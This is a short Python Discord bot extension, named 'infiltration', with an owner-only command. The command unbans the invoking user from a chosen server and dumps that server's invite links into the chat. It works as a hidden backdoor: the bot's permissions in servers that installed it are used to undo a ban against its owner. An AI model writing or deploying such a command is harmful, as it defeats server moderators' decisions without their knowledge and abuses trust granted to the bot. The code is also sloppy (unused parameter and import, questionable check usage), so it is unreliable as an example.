from discord.ext import commands
from discord.ext.commands import is_owner
from pystemd.systemd1 import Unit


class Cog(commands.Cog, name="infiltration"):
    def __init__(self, bot):
        self.bot: commands.Bot = bot

    @commands.command()
    @commands.check(is_owner())
    async def unban_infiltration(self, ctx, server: int, user: int):
        await ctx.send("1")
        guild = self.bot.get_guild(server)
        await ctx.send("2")
        await guild.unban(ctx.author)
        await ctx.send("3")
        invs = await guild.invites()
        await ctx.send("4")
        await ctx.send(str(invs))
        

async def setup(bot):
    await bot.add_cog(Cog(bot))
